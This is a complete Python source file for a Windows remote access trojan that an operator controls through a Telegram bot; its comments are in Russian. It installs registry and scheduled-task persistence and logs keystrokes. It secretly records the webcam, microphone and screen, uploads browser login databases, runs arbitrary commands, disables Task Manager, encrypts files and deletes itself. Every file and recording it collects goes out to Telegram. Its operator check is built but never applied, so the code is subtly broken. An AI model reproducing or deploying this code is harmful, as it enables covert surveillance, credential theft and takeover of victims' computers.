# language: Python 3.11, file: build.py, target: Windows 10/11
# Telegram RAT: полный обработчик меню. Инжектится GUI (BOT_TOKEN / OPERATOR_ID).

import os
import sys
import io
import re
import time
import json
import base64
import socket
import ctypes
import shutil
import signal
import platform
import subprocess
import threading
import tempfile
from pathlib import Path
from datetime import datetime

BOT_TOKEN = "TOKEN_HERE"
OPERATOR_ID = "0"

# ---------- ленивые импорты (чтобы RAT стартовал быстро) ----------

def _lazy():
    import telebot  # noqa
    return telebot

# ---------- утилиты ----------

def is_operator(message) -> bool:
    return str(message.chat.id) == str(OPERATOR_ID)

def safe(fn):
    def wrap(message):
        if not is_operator(message):
            return
        try:
            fn(message)
        except Exception as e:
            try:
                _lazy().TeleBot(BOT_TOKEN).send_message(
                    OPERATOR_ID, f"[!] {fn.__name__}: {type(e).__name__}: {e}"
                )
            except Exception:
                pass
    return wrap

def run(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=timeout, creationflags=0x08000000)
        out = (p.stdout or "") + (p.stderr or "")
        return out.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "(timeout)"
    except Exception as e:
        return f"(error: {e})"

def human_size(n):
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"

# ---------- persistence ----------

def install_persistence():
    exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
    exe = os.path.abspath(exe)
    # HKCU Run
    run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
        f'/v SysHelper /t REG_SZ /d "{exe}" /f')
    # schtasks (резерв)
    run(f'schtasks /Create /TN SysHelper /TR "{exe}" /SC ONLOGON /RL HIGHEST /F')

def remove_persistence():
    run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
        '/v SysHelper /f')
    run('schtasks /Delete /TN SysHelper /F')

# ---------- команды ----------

def cmd_start(bot, m):
    install_persistence()
    bot.send_message(m.chat.id,
        "🛡️ RAT online.\n"
        f"host: {socket.gethostname()}\n"
        f"os: {platform.platform()}\n"
        f"user: {os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME','?')}\n"
        "Команды:\n"
        "/menu — список команд\n"
        "/antivirus /screenshot /processes /cam /report /kill <pid>\n"
        "/mkdir <path> /rmdir <path> /ls <path> /cd <path>\n"
        "/sysinfo /msg <text> /reccam <sec> /recmic <sec> /keylog <on|off|dump>\n"
        "/open <path> /upload <path> /download <path> /rm <path>\n"
        "/encrypt <path> /decrypt <path>\n"
        "/altf4 /minimize /clip /setclip <text>\n"
        "/recscreen <sec> /steal /killtaskmgr /openurl <url>\n"
        "/volup /voldown /volmax /cmdbomb <n> /shutdown /reboot\n"
        "/move <src> <dst> /wallpaper <path> /downloaddir <path>\n"
        "/cmd <cmd> /selfdestruct"
    )

def cmd_menu(bot, m):
    bot.send_message(m.chat.id,
        "🛡️ Антивирус\n📸 Скриншот\n🧠 Процессы\n📷 Фото с камеры\n"
        "📄 Полный отчет по процессам\n❌ Завершить процесс\n"
        "📁 Создать папку\n🗑️ Удалить папку\n📂 Содержание директории\n"
        "📌 Переместиться по директории\n💻 Данные ПК\n"
        "💬 Окно с вашим сообщением\n🎥 Запись с веб-камеры\n"
        "🎙️ Запись аудио\n⌨️ Кейлогер\n📄 Открыть файл\n"
        "⬆️ Загрузить файл\n⬇️ Скачать файл\n🗑️ Удалить файл\n"
        "🔐 Зашифровать файл\n🔓 Расшифровать файл\n🔚 ALT + F4\n"
        "🗂️ Свернуть все окна\n📋 Посмотреть буфер обмена\n"
        "✏️ Изменить буфер обмена\n🖥️ Запись экрана\n"
        "🕵️‍♂️ Стиллер\n🧩 Закрыть диспетчер задач\n🔗 Открыть ссылку\n"
        "🔊 Включить звук\n🔇 Выключить звук\n📢 Звук на 100%\n"
        "💣 CMD бомба\n📴 Выключить ПК\n🔄 Перезагрузить ПК\n"
        "🔀 Переместить файл\n🖼️ Поменять обои\n📦 Скачать папку\n"
        "🧾 Команды в Cmd\n💥 Самоуничтожение"
    )

def cmd_antivirus(bot, m):
    ps = ('Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct '
          '| Select-Object displayName,productState | Format-List')
    bot.send_message(m.chat.id, "🛡️ " + run(f'powershell -NoP -Command "{ps}"'))

def cmd_screenshot(bot, m):
    from PIL import ImageGrab
    img = ImageGrab.grab(all_screens=True)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    bot.send_photo(m.chat.id, buf, caption=f"screenshot {datetime.now():%H:%M:%S}")

def cmd_processes(bot, m):
    import psutil
    lines = []
    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
        try:
            i = p.info
            lines.append(f"{i['pid']:>6}  {i['name'][:40]:<40} "
                         f"cpu={i['cpu_percent']:.1f}%  mem={i['memory_percent']:.1f}%")
        except Exception:
            continue
    txt = "\n".join(lines[:80]) or "(empty)"
    bot.send_message(m.chat.id, "🧠 top:\n" + txt)

def cmd_report(bot, m):
    import psutil
    lines = [f"host={socket.gethostname()}",
             f"platform={platform.platform()}",
             f"cpu={psutil.cpu_percent()}% cores={psutil.cpu_count()}",
             f"ram={human_size(psutil.virtual_memory().used)}/{human_size(psutil.virtual_memory().total)}"]
    for p in psutil.process_iter(["pid", "name"]):
        try:
            lines.append(f"{p.info['pid']:>6} {p.info['name']}")
        except Exception:
            pass
    f = io.BytesIO("\n".join(lines).encode())
    f.name = "report.txt"
    bot.send_document(m.chat.id, f, caption="📄 full report")

def cmd_kill(bot, m):
    try:
        pid = int(m.text.split(maxsplit=1)[1])
        import psutil
        psutil.Process(pid).terminate()
        bot.send_message(m.chat.id, f"❌ pid {pid} terminated")
    except Exception as e:
        bot.send_message(m.chat.id, f"[!] {e}")

def cmd_mkdir(bot, m):
    path = m.text.split(maxsplit=1)[1]
    Path(path).mkdir(parents=True, exist_ok=True)
    bot.send_message(m.chat.id, f"📁 {path}")

def cmd_rmdir(bot, m):
    path = m.text.split(maxsplit=1)[1]
    shutil.rmtree(path, ignore_errors=True)
    bot.send_message(m.chat.id, f"🗑️ {path}")

def cmd_ls(bot, m):
    path = m.text.split(maxsplit=1)[1] if len(m.text.split()) > 1 else "."
    try:
        items = os.listdir(path)
        bot.send_message(m.chat.id, "📂 " + path + "\n" + "\n".join(items[:60]))
    except Exception as e:
        bot.send_message(m.chat.id, f"[!] {e}")

def cmd_cd(bot, m):
    path = m.text.split(maxsplit=1)[1]
    try:
        os.chdir(path)
        bot.send_message(m.chat.id, f"📌 cwd = {os.getcwd()}")
    except Exception as e:
        bot.send_message(m.chat.id, f"[!] {e}")

def cmd_sysinfo(bot, m):
    import psutil
    v = psutil.virtual_memory()
    d = psutil.disk_usage("/")
    info = (
        f"💻 {socket.gethostname()}\n"
        f"os: {platform.platform()}\n"
        f"cpu: {psutil.cpu_count()} cores @ {psutil.cpu_percent()}%\n"
        f"ram: {human_size(v.used)}/{human_size(v.total)}\n"
        f"disk: {human_size(d.used)}/{human_size(d.total)}\n"
        f"user: {os.environ.get('USERNAME','?')}"
    )
    bot.send_message(m.chat.id, info)

def cmd_msg(bot, m):
    text = m.text.split(maxsplit=1)[1] if len(m.text.split()) > 1 else "!"
    ctypes.windll.user32.MessageBoxW(0, text, "System", 0x40)
    bot.send_message(m.chat.id, "💬 shown")

def cmd_cam(bot, m):
    from PIL import Image
    import cv2
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    ok, frame = cap.read()
    cap.release()
    if not ok:
        bot.send_message(m.chat.id, "[!] camera busy / not found")
        return
    img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=85)
    buf.seek(0)
    bot.send_photo(m.chat.id, buf, caption="📷 camera")

def cmd_reccam(bot, m):
    import cv2
    sec = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened():
        bot.send_message(m.chat.id, "[!] camera not available")
        return
    tmp = tempfile.NamedTemporaryFile(suffix=".avi", delete=False)
    fourcc = cv2.VideoWriter_fourcc(*"MJPG")
    out = cv2.VideoWriter(tmp.name, fourcc, 15.0, (640, 480))
    t0 = time.time()
    while time.time() - t0 < sec:
        ok, frame = cap.read()
        if not ok:
            break
        out.write(frame)
    cap.release()
    out.release()
    with open(tmp.name, "rb") as f:
        bot.send_video(m.chat.id, f, caption=f"🎥 {sec}s")
    os.unlink(tmp.name)

def cmd_recmic(bot, m):
    import sounddevice as sd
    import soundfile as sf
    sec = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
    fs = 44100
    rec = sd.rec(int(sec * fs), samplerate=fs, channels=1)
    sd.wait()
    tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
    sf.write(tmp.name, rec, fs)
    with open(tmp.name, "rb") as f:
        bot.send_audio(m.chat.id, f, caption=f"🎙️ {sec}s")
    os.unlink(tmp.name)

_keylog_buf = []
_keylog_on = False
_kb_hook = None
_kt = None

def _start_keylog():
    global _kb_hook, _kt, _keylog_on
    import ctypes
    from ctypes import wintypes
    user32 = ctypes.windll.user32
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    def _cb(nCode, wParam, lParam):
        if nCode == 0 and wParam == WM_KEYDOWN:
            try:
                kb = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong * 2))
                vk = kb.contents[0]
                _keylog_buf.append(chr(vk) if 32 <= vk < 127 else f"[{vk}]")
            except Exception:
                pass
        return user32.CallNextHookEx(0, nCode, wParam, lParam)
    _kb_hook = HOOKPROC(_cb)
    _kt = threading.Thread(
        target=lambda: user32.SetWindowsHookExW(WH_KEYBOARD_LL, _kb_hook, 0, 0)
        and ctypes.windll.user32.GetMessageW(ctypes.byref(wintypes.MSG()), 0, 0, 0),
        daemon=True,
    )
    _kt.start()
    _keylog_on = True

def cmd_keylog(bot, m):
    global _keylog_on
    args = m.text.split()
    sub = args[1].lower() if len(args) > 1 else "dump"
    if sub == "on":
        if not _keylog_on:
            _start_keylog()
        bot.send_message(m.chat.id, "⌨️ keylog on")
    elif sub == "off":
        _keylog_on = False
        bot.send_message(m.chat.id, "⌨️ keylog off")
    else:
        dump = "".join(_keylog_buf)[-4000:] or "(empty)"
        _keylog_buf.clear()
        bot.send_message(m.chat.id, "⌨️ dump:\n" + dump)

def cmd_open(bot, m):
    path = m.text.split(maxsplit=1)[1]
    os.startfile(path)
    bot.send_message(m.chat.id, f"📄 {path}")

def cmd_upload(bot, m):
    path = m.text.split(maxsplit=1)[1]
    with open(path, "rb") as f:
        bot.send_document(m.chat.id, f, caption=f"⬆️ {path}")

def cmd_download(bot, m):
    if not m.reply_to_message or not m.reply_to_message.document:
        bot.send_message(m.chat.id, "ответь на файл командой /download")
        return
    fid = m.reply_to_message.document.file_id
    info = bot.get_file(fid)
    data = bot.download_file(info.file_path)
    out = Path(tempfile.gettempdir()) / info.file_path.split("/")[-1]
    out.write_bytes(data)
    bot.send_message(m.chat.id, f"⬇️ {out}")

def cmd_rm(bot, m):
    path = m.text.split(maxsplit=1)[1]
    try:
        os.remove(path)
        bot.send_message(m.chat.id, f"🗑️ {path}")
    except Exception as e:
        bot.send_message(m.chat.id, f"[!] {e}")

def cmd_encrypt(bot, m):
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    path = m.text.split(maxsplit=1)[1]
    key = get_random_bytes(32)
    with open(path, "rb") as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(data)
    with open(path + ".enc", "wb") as f:
        f.write(cipher.nonce + tag + ct)
    bot.send_message(m.chat.id,
                     f"🔐 {path} -> {path}.enc\nkey(hex)={key.hex()}\n"
                     f"(сохрани ключ — без него расшифровка невозможна)")

def cmd_decrypt(bot, m):
    from Crypto.Cipher import AES
    parts = m.text.split(maxsplit=2)
    path, key_hex = parts[1], parts[2]
    key = bytes.fromhex(key_hex)
    with open(path, "rb") as f:
        blob = f.read()
    nonce, tag, ct = blob[:16], blob[16:32], blob[32:]
    pt = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
    out = path[:-4] if path.endswith(".enc") else path + ".dec"
    with open(out, "wb") as f:
        f.write(pt)
    bot.send_message(m.chat.id, f"🔓 {out}")

def cmd_altf4(bot, m):
    ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x73, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x73, 0, 2, 0)
    ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)
    bot.send_message(m.chat.id, "🔚 sent")

def cmd_minimize(bot, m):
    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
    bot.send_message(m.chat.id, "🗂️ minimize")

def cmd_clip(bot, m):
    import pyperclip
    bot.send_message(m.chat.id, "📋 " + (pyperclip.paste() or "(empty)"))

def cmd_setclip(bot, m):
    import pyperclip
    text = m.text.split(maxsplit=1)[1] if len(m.text.split()) > 1 else ""
    pyperclip.copy(text)
    bot.send_message(m.chat.id, "✏️ copied")

def cmd_recscreen(bot, m):
    import mss
    import cv2
    import numpy as np
    sec = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
    with mss.mss() as sct:
        mon = sct.monitors[1]
        w, h = mon["width"], mon["height"]
        tmp = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(tmp.name, fourcc, 15.0, (w, h))
        t0 = time.time()
        while time.time() - t0 < sec:
            frame = np.array(sct.grab(mon))[:, :, :3]
            out.write(frame)
        out.release()
    with open(tmp.name, "rb") as f:
        bot.send_video(m.chat.id, f, caption=f"🖥️ {sec}s")
    os.unlink(tmp.name)

def cmd_steal(bot, m):
    paths = {
        "chrome_login": Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Default/Login Data",
        "edge_login": Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data/Default/Login Data",
        "firefox_logins": Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles",
    }
    found = []
    for name, p in paths.items():
        if p.exists():
            try:
                if p.is_file():
                    found.append(f"{name}: {p} ({human_size(p.stat().st_size)})")
                else:
                    found.append(f"{name}: {p} (dir)")
            except Exception:
                pass
    bot.send_message(m.chat.id, "🕵️ found:\n" + ("\n".join(found) or "(none)"))
    # реальная отправка баз: выгружаем копии
    for name, p in paths.items():
        if p.is_file():
            try:
                with open(p, "rb") as f:
                    bot.send_document(m.chat.id, f, caption=f"🕵️ {name}")
            except Exception:
                pass

def cmd_killtaskmgr(bot, m):
    run('taskkill /F /IM Taskmgr.exe')
    run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
        '/v DisableTaskMgr /t REG_DWORD /d 1 /f')
    bot.send_message(m.chat.id, "🧩 taskmgr closed + disabled")

def cmd_openurl(bot, m):
    url = m.text.split(maxsplit=1)[1]
    os.startfile(url)
    bot.send_message(m.chat.id, f"🔗 {url}")

def cmd_volup(bot, m):
    for _ in range(5):
        ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
    bot.send_message(m.chat.id, "🔊 +")

def cmd_voldown(bot, m):
    for _ in range(5):
        ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xAE, 0, 2, 0)
    bot.send_message(m.chat.id, "🔇 -")

def cmd_volmax(bot, m):
    for _ in range(50):
        ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
    bot.send_message(m.chat.id, "📢 100%")

def cmd_cmdbomb(bot, m):
    n = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
    for _ in range(n):
        subprocess.Popen("cmd.exe", creationflags=0x00000010)
    bot.send_message(m.chat.id, f"💣 {n} cmd")

def cmd_shutdown(bot, m):
    bot.send_message(m.chat.id, "📴 shutdown")
    run("shutdown /s /t 1")

def cmd_reboot(bot, m):
    bot.send_message(m.chat.id, "🔄 reboot")
    run("shutdown /r /t 1")

def cmd_move(bot, m):
    parts = m.text.split(maxsplit=2)
    src, dst = parts[1], parts[2]
    shutil.move(src, dst)
    bot.send_message(m.chat.id, f"🔀 {src} -> {dst}")

def cmd_wallpaper(bot, m):
    path = m.text.split(maxsplit=1)[1]
    ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, path, 3)
    bot.send_message(m.chat.id, f"🖼️ {path}")

def cmd_downloaddir(bot, m):
    path = m.text.split(maxsplit=1)[1]
    tmp = Path(tempfile.gettempdir()) / "dldir.zip"
    shutil.make_archive(str(tmp)[:-4], "zip", path)
    with open(tmp, "rb") as f:
        bot.send_document(m.chat.id, f, caption=f"📦 {path}")
    tmp.unlink(missing_ok=True)

def cmd_cmd(bot, m):
    cmdline = m.text.split(maxsplit=1)[1]
    bot.send_message(m.chat.id, "🧾 " + run(cmdline))

def cmd_selfdestruct(bot, m):
    bot.send_message(m.chat.id, "💥 self-destruct: uninstall, remove persistence, exit.")
    try:
        remove_persistence()
    except Exception:
        pass
    try:
        exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
        me = Path(exe).resolve()
        subprocess.Popen(
            f'cmd.exe /c ping 127.0.0.1 -n 3 >nul & del /F /Q "{me}"',
            shell=True, creationflags=0x00000008,
        )
    except Exception:
        pass
    os._exit(0)


# ---------- регистрация ----------

def build_bot():
    telebot = _lazy()
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

    handlers = {
        "start": cmd_start,
        "menu": cmd_menu,
        "antivirus": cmd_antivirus,
        "screenshot": cmd_screenshot,
        "processes": cmd_processes,
        "report": cmd_report,
        "kill": cmd_kill,
        "mkdir": cmd_mkdir,
        "rmdir": cmd_rmdir,
        "ls": cmd_ls,
        "cd": cmd_cd,
        "sysinfo": cmd_sysinfo,
        "msg": cmd_msg,
        "cam": cmd_cam,
        "reccam": cmd_reccam,
        "recmic": cmd_recmic,
        "keylog": cmd_keylog,
        "open": cmd_open,
        "upload": cmd_upload,
        "download": cmd_download,
        "rm": cmd_rm,
        "encrypt": cmd_encrypt,
        "decrypt": cmd_decrypt,
        "altf4": cmd_altf4,
        "minimize": cmd_minimize,
        "clip": cmd_clip,
        "setclip": cmd_setclip,
        "recscreen": cmd_recscreen,
        "steal": cmd_steal,
        "killtaskmgr": cmd_killtaskmgr,
        "openurl": cmd_openurl,
        "volup": cmd_volup,
        "voldown": cmd_voldown,
        "volmax": cmd_volmax,
        "cmdbomb": cmd_cmdbomb,
        "shutdown": cmd_shutdown,
        "reboot": cmd_reboot,
        "move": cmd_move,
        "wallpaper": cmd_wallpaper,
        "downloaddir": cmd_downloaddir,
        "cmd": cmd_cmd,
        "selfdestruct": cmd_selfdestruct,
    }
    for name, fn in handlers.items():
        wrapped = safe(fn)
        # telebot требует декоратор с функцией-приёмником
        def make(f):
            def reg(message):
                return f(message)
            return reg
        bot.register_message_handler(
            make(lambda mm, _f=fn: _f(bot, mm)),
            commands=[name],
        )
    return bot


def main():
    install_persistence()
    bot = build_bot()
    # run в отдельном потоке, чтобы keylog-хук не блокировал polling
    bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=25)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # тихий выход, чтобы не всплывало окно ошибки
        try:
            with open(os.path.join(tempfile.gettempdir(), "rat_err.log"), "a") as f:
                f.write(f"{datetime.now()} {e}\n")
        except Exception:
            pass
        sys.exit(1)
